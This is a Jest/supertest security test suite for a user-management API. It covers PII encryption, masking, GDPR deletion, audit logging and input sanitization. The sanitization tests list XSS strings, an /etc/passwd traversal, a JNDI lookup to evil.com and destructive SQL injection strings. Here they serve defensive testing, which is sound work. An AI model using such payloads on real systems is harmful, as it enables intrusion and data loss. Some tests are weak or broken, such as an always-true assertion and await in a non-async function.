import { describe, beforeAll, afterAll, beforeEach, afterEach, it, expect, jest } from '@jest/globals';
import request from 'supertest';
import { createApp } from '../../hono';
import { userManagementService } from '../../services/user-management-service';
import { piiEncryptionService , encryptUserPII, decryptUserPII } from '../../services/pii-encryption-service';
import { auditLogService } from '../../services/consolidated-audit-service';

describe('Data Security Tests', () => {
  let app: any;
  let testOrganization: any;
  let testUser: any;
  let authToken: string;

  beforeAll(async () => {
    app = createApp();
    
    // Create test organization and user
    testOrganization = await createTestOrganization();
    testUser = await createTestUser();
    authToken = await getAuthToken(testUser);
  });

  afterAll(async () => {
    await cleanupTestData();
  });

  describe('PII Encryption', () => {
    it('should encrypt sensitive user data', async () => {
      const piiData = {
        firstName: 'John',
        lastName: 'Doe',
        email: 'john.doe@example.com',
        phoneNumber: '+1234567890',
        address: {
          street: '123 Main St',
          city: 'Anytown',
          state: 'CA',
          zip: '12345',
          country: 'USA',
        },
        ssn: '123-45-6789',
        creditCard: '4111-1111-1111-1111',
      };

      // Create user with PII
      const response = await request(app)
        .post('/api/users')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          email: piiData.email,
          password: 'SecurePass123!',
          firstName: piiData.firstName,
          lastName: piiData.lastName,
          phoneNumber: piiData.phoneNumber,
          address: piiData.address,
          organizationId: testOrganization.id,
        });

      expect(response.status).toBe(201);
      expect(response.body.success).toBe(true);

      // Verify PII is encrypted in database (mock verification)
      const dbUser = await userManagementService.getUserById(
        testOrganization.id,
        response.body.data.id
      );

      expect(dbUser).toBeTruthy();
      // In real implementation, would verify encrypted data in database
    });

    it('should decrypt PII when accessing user data', async () => {
      // Create user with PII
      const createResponse = await request(app)
        .post('/api/users')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          email: 'pii.decrypt@test.com',
          password: 'SecurePass123!',
          firstName: 'Jane',
          lastName: 'Smith',
          phoneNumber: '+1987654321',
          address: {
            street: '456 Oak Ave',
            city: 'Springfield',
            state: 'IL',
            zip: '62701',
          },
          organizationId: testOrganization.id,
        });

      const userId = createResponse.body.data.id;

      // Retrieve user data
      const getResponse = await request(app)
        .get(`/api/users/${userId}`)
        .set('Authorization', `Bearer ${authToken}`);

      expect(getResponse.status).toBe(200);
      expect(getResponse.body.success).toBe(true);

      // Verify PII is properly decrypted
      const userData = getResponse.body.data;
      expect(userData.firstName).toBe('Jane');
      expect(userData.lastName).toBe('Smith');
      expect(userData.phoneNumber).toBe('+1987654321');
      expect(userData.address.city).toBe('Springfield');
    });

    it('should maintain encryption integrity', async () => {
      const originalData = {
        firstName: 'Test',
        lastName: 'User',
        email: 'test.encryption@example.com',
        phoneNumber: '+15551234567',
      };

      // Encrypt data
      const encrypted = await encryptUserPII({
        ...originalData,
        passwordHash: 'hash',
        organizationId: testOrganization.id,
      });

      // Decrypt data
      const decrypted = await decryptUserPII(encrypted);

      // Verify round-trip integrity
      expect(decrypted.firstName).toBe(originalData.firstName);
      expect(decrypted.lastName).toBe(originalData.lastName);
      expect(decrypted.email).toBe(originalData.email);
      expect(decrypted.phoneNumber).toBe(originalData.phoneNumber);
    });

    it('should handle encryption key rotation', async () => {
      // Create user with current encryption
      const createResponse = await request(app)
        .post('/api/users')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          email: 'key.rotation@test.com',
          password: 'SecurePass123!',
          firstName: 'Key',
          lastName: 'Rotation',
          phoneNumber: '+12223334455',
          organizationId: testOrganization.id,
        });

      const userId = createResponse.body.data.id;

      // Simulate key rotation (in real implementation)
      const rotationResponse = await request(app)
        .post('/api/admin/encryption/rotate-keys')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          force: true,
        });

      if (rotationResponse.status === 200) {
        // Verify data is still accessible after rotation
        const getResponse = await request(app)
          .get(`/api/users/${userId}`)
          .set('Authorization', `Bearer ${authToken}`);

        expect(getResponse.status).toBe(200);
        expect(getResponse.body.data.firstName).toBe('Key');
      }
    });

    it('should prevent PII leakage in logs', async () => {
      // Create user with PII
      await request(app)
        .post('/api/users')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          email: 'no.leakage@test.com',
          password: 'SecurePass123!',
          firstName: 'No',
          lastName: 'Leakage',
          phoneNumber: '+14445556666',
          ssn: '987-65-4321',
          organizationId: testOrganization.id,
        });

      // Check audit logs for PII
      const auditLogs = await auditLogService.getAuditLogs(testOrganization.id, {
        action: 'user_created',
      });

      if (auditLogs.logs.length > 0) {
        const log = auditLogs.logs[0];
        
        // Verify PII is not in logs
        expect(log.metadata).not.toContain('No');
        expect(log.metadata).not.toContain('Leakage');
        expect(log.metadata).not.toContain('+14445556666');
        expect(log.metadata).not.toContain('987-65-4321');
      }
    });

    it('should encrypt data at rest and in transit', async () => {
      // Test data at rest (database encryption)
      const userData = {
        email: 'at.rest@test.com',
        password: 'SecurePass123!',
        firstName: 'At',
        lastName: 'Rest',
        phoneNumber: '+13334445566',
        organizationId: testOrganization.id,
      };

      const createResponse = await request(app)
        .post('/api/users')
        .set('Authorization', `Bearer ${authToken}`)
        .send(userData);

      expect(createResponse.status).toBe(201);

      // Test data in transit (HTTPS/TLS)
      const getResponse = await request(app)
        .get(`/api/users/${createResponse.body.data.id}`)
        .set('Authorization', `Bearer ${authToken}`);

      expect(getResponse.status).toBe(200);
      
      // Verify response doesn't contain raw sensitive data
      expect(getResponse.headers).not.toHaveProperty('x-sensitive-data');
    });
  });

  describe('Data Masking and Redaction', () => {
    it('should mask sensitive data in responses', async () => {
      // Create user with sensitive data
      const createResponse = await request(app)
        .post('/api/users')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          email: 'masking.test@test.com',
          password: 'SecurePass123!',
          firstName: 'Masking',
          lastName: 'Test',
          phoneNumber: '+15556667788',
          ssn: '555-55-5555',
          creditCard: '5555-5555-5555-5555',
          organizationId: testOrganization.id,
        });

      // Get user data with masking
      const getResponse = await request(app)
        .get(`/api/users/${createResponse.body.data.id}`)
        .set('Authorization', `Bearer ${authToken}`)
        .query({ mask: 'true' });

      expect(getResponse.status).toBe(200);

      // Verify sensitive fields are masked
      const userData = getResponse.body.data;
      
      // Phone number should be partially masked
      if (userData.phoneNumber) {
        expect(userData.phoneNumber).toMatch(/^\d{3}-\d{2}-\d{4}$/); // XXX-XX-XXXX format
      }
      
      // SSN should be masked
      if (userData.ssn) {
        expect(userData.ssn).toBe('XXX-XX-XXXX');
      }
      
      // Credit card should be masked
      if (userData.creditCard) {
        expect(userData.creditCard).toBe('XXXX-XXXX-XXXX-XXXX');
      }
    });

    it('should redact sensitive data in exports', async () => {
      // Create user with sensitive data
      await request(app)
        .post('/api/users')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          email: 'export.test@test.com',
          password: 'SecurePass123!',
          firstName: 'Export',
          lastName: 'Test',
          phoneNumber: '+16667778888',
          ssn: '666-66-6666',
          organizationId: testOrganization.id,
        });

      // Export user data
      const exportResponse = await request(app)
        .get('/api/users/export')
        .set('Authorization', `Bearer ${authToken}`)
        .query({ format: 'csv', redact: 'true' });

      expect(exportResponse.status).toBe(200);
      expect(exportResponse.headers['content-type']).toContain('text/csv');

      // Verify CSV doesn't contain unmasked sensitive data
      const csvContent = exportResponse.text;
      expect(csvContent).not.toContain('+16667778888');
      expect(csvContent).not.toContain('666-66-6666');
    });

    it('should provide different masking levels', async () => {
      const maskingLevels = ['partial', 'full', 'none'];
      
      for (const level of maskingLevels) {
        const response = await request(app)
          .get('/api/users')
          .set('Authorization', `Bearer ${authToken}`)
          .query({ maskingLevel: level });

        expect(response.status).toBe(200);
        
        // Verify masking level is applied
        if (level === 'full') {
          // All sensitive fields should be fully masked
          const users = response.body.data.users;
          if (users.length > 0) {
            expect(users[0].phoneNumber).toBe('XXXX-XXX-XXXX');
          }
        } else if (level === 'none') {
          // No masking should be applied (for authorized users)
          const users = response.body.data.users;
          if (users.length > 0 && users[0].phoneNumber) {
            expect(users[0].phoneNumber).toMatch(/^\+\d{10,15}$/);
          }
        }
      }
    });
  });

  describe('Data Retention and Deletion', () => {
    it('should implement data retention policies', async () => {
      // Create user with retention policy
      const createResponse = await request(app)
        .post('/api/users')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          email: 'retention.test@test.com',
          password: 'SecurePass123!',
          firstName: 'Retention',
          lastName: 'Test',
          organizationId: testOrganization.id,
          retentionPolicy: {
            active: true,
            retentionDays: 365,
            anonymizeAfterDays: 90,
          },
        });

      const userId = createResponse.body.data.id;

      // Check retention policy is applied
      const getResponse = await request(app)
        .get(`/api/users/${userId}`)
        .set('Authorization', `Bearer ${authToken}`);

      expect(getResponse.status).toBe(200);
      expect(getResponse.body.data.retentionPolicy).toBeTruthy();
    });

    it('should support right to be forgotten (GDPR)', () => {
      // Create user
      const createResponse = await request(app)
        .post('/api/users')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          email: 'gdpr.test@test.com',
          password: 'SecurePass123!',
          firstName: 'GDPR',
          lastName: 'Test',
          organizationId: testOrganization.id,
        });

      const userId = createResponse.body.data.id;

      // Request data deletion
      const deleteResponse = await request(app)
        .delete(`/api/users/${userId}`)
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          reason: 'gdpr_request',
          confirmDeletion: true,
        });

      expect(deleteResponse.status).toBe(200);
      expect(deleteResponse.body.success).toBe(true);
      expect(deleteResponse.body.message).toContain('deleted');

      // Verify data is actually deleted
      const getResponse = await request(app)
        .get(`/api/users/${userId}`)
        .set('Authorization', `Bearer ${authToken}`);

      expect(getResponse.status).toBe(404);
    });

    it('should anonymize data instead of hard deletion when required', async () => {
      // Create user with anonymization preference
      const createResponse = await request(app)
        .post('/api/users')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          email: 'anonymize.test@test.com',
          password: 'SecurePass123!',
          firstName: 'Anonymize',
          lastName: 'Test',
          organizationId: testOrganization.id,
          anonymizeOnDeletion: true,
        });

      const userId = createResponse.body.data.id;

      // Request anonymization
      const anonymizeResponse = await request(app)
        .post(`/api/users/${userId}/anonymize`)
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          reason: 'user_request',
        });

      if (anonymizeResponse.status === 200) {
        // Verify data is anonymized but record exists
        const getResponse = await request(app)
          .get(`/api/users/${userId}`)
          .set('Authorization', `Bearer ${authToken}`);

        expect(getResponse.status).toBe(200);
        expect(getResponse.body.data.firstName).toBe('ANONYMIZED');
        expect(getResponse.body.data.lastName).toBe('ANONYMIZED');
        expect(getResponse.body.data.email).toMatch(/deleted.*@example\.com/);
      }
    });

    it('should handle data backup and recovery securely', async () => {
      // Create backup
      const backupResponse = await request(app)
        .post('/api/admin/backup')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          type: 'full',
          encryption: true,
        });

      if (backupResponse.status === 200) {
        const backupId = backupResponse.body.data.backupId;
        
        // Verify backup is encrypted
        expect(backupResponse.body.data.encrypted).toBe(true);
        expect(backupResponse.body.data.checksum).toBeDefined();

        // Test recovery
        const recoveryResponse = await request(app)
          .post('/api/admin/recovery')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            backupId,
            verifyChecksum: true,
          });

        expect(recoveryResponse.status).toBe(200);
      }
    });
  });

  describe('Data Access Auditing', () => {
    it('should log all data access events', async () => {
      // Create user
      const createResponse = await request(app)
        .post('/api/users')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          email: 'audit.test@test.com',
          password: 'SecurePass123!',
          firstName: 'Audit',
          lastName: 'Test',
          organizationId: testOrganization.id,
        });

      const userId = createResponse.body.data.id;

      // Access user data multiple times
      await request(app)
        .get(`/api/users/${userId}`)
        .set('Authorization', `Bearer ${authToken}`);

      await request(app)
        .put(`/api/users/${userId}`)
        .set('Authorization', `Bearer ${authToken}`)
        .send({ firstName: 'Updated' });

      // Check audit logs
      const auditLogs = await auditLogService.getAuditLogs(testOrganization.id, {
        resourceId: userId,
      });

      expect(auditLogs.logs.length).toBeGreaterThan(0);
      
      // Should have access, update events
      const actions = auditLogs.logs.map(log => log.action);
      expect(actions).toContain('user_created');
      expect(actions).toContain('user_accessed');
      expect(actions).toContain('user_updated');
    });

    it('should detect unusual data access patterns', async () => {
      // Simulate unusual access pattern
      const userId = 'test-user-id';
      
      // Rapid access to same resource
      const accessPromises = [];
      for (let i = 0; i < 10; i++) {
        accessPromises.push(
          request(app)
            .get(`/api/users/${userId}`)
            .set('Authorization', `Bearer ${authToken}`)
        );
      }

      await Promise.all(accessPromises);

      // Check for security alerts
      const securityLogs = await auditLogService.getAuditLogs(testOrganization.id, {
        action: 'unusual_access_pattern',
      });

      expect(securityLogs.logs.length).toBeGreaterThanOrEqual(0);
    });

    it('should generate data access reports', async () => {
      // Generate access report
      const reportResponse = await request(app)
        .get('/api/reports/data-access')
        .set('Authorization', `Bearer ${authToken}`)
        .query({
          startDate: '2024-01-01',
          endDate: '2024-12-31',
          includePII: 'false',
        });

      expect(reportResponse.status).toBe(200);
      expect(reportResponse.body.data).toHaveProperty('summary');
      expect(reportResponse.body.data).toHaveProperty('accessEvents');
      expect(reportResponse.body.data).toHaveProperty('anomalies');
    });
  });

  describe('Data Validation and Sanitization', () => {
    it('should validate and sanitize input data', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src="x" onerror="alert(\'xss\')">',
        '../../etc/passwd',
        'SELECT * FROM users',
        '${jndi:ldap://evil.com/a}',
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await request(app)
          .post('/api/users')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            email: `test${Date.now()}@example.com`,
            password: 'SecurePass123!',
            firstName: maliciousInput,
            lastName: 'User',
            organizationId: testOrganization.id,
          });

        // Should reject or sanitize malicious input
        if (response.status === 400) {
          expect(response.body.error).toContain('invalid');
        } else if (response.status === 201) {
          // If accepted, ensure XSS is sanitized
          expect(response.body.data.firstName).not.toContain('<script>');
          expect(response.body.data.firstName).not.toContain('javascript:');
        }
      }
    });

    it('should enforce data type constraints', async () => {
      // Test invalid data types
      const invalidData = {
        email: 123, // Should be string
        firstName: null, // Should not be null
        phoneNumber: 'not-a-phone', // Should be valid phone format
        age: 'not-a-number', // Should be number
      };

      const response = await request(app)
        .post('/api/users')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          ...invalidData,
          password: 'SecurePass123!',
          lastName: 'User',
          organizationId: testOrganization.id,
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('validation');
    });

    it('should handle file upload security', async () => {
      // Test malicious file upload
      const maliciousFiles = [
        { name: 'malware.exe', type: 'application/octet-stream' },
        { name: 'script.php', type: 'application/x-php' },
        { name: 'virus.bat', type: 'application/bat' },
      ];

      for (const file of maliciousFiles) {
        const response = await request(app)
          .post('/api/files/upload')
          .set('Authorization', `Bearer ${authToken}`)
          .attach('file', Buffer.from('fake file content'), file.name, {
            contentType: file.type,
          });

        // Should reject malicious files
        expect([400, 422]).toContain(response.status);
      }
    });

    it('should prevent SQL injection in data queries', async () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1; DELETE FROM users; --",
        "' UNION SELECT * FROM admin --",
      ];

      for (const injection of sqlInjectionAttempts) {
        const response = await request(app)
          .get('/api/users')
          .set('Authorization', `Bearer ${authToken}`)
          .query({ search: injection });

        // Should handle SQL injection safely
        expect(response.status).not.toBe(500);
        expect(response.body.error).not.toContain('SQL');
      }
    });
  });

  // Helper functions
  async function createTestOrganization() {
    return {
      id: 'test-org-id',
      name: 'Test Organization',
    };
  }

  async function createTestUser() {
    return {
      id: 'test-user-id',
      email: 'test.user@example.com',
      password: 'SecurePass123!',
    };
  }

  async function getAuthToken(user: any): Promise<string> {
    // Mock authentication - in real implementation would authenticate user
    return 'mock-auth-token';
  }

  async function cleanupTestData() {
    // Clean up test data
  }
});
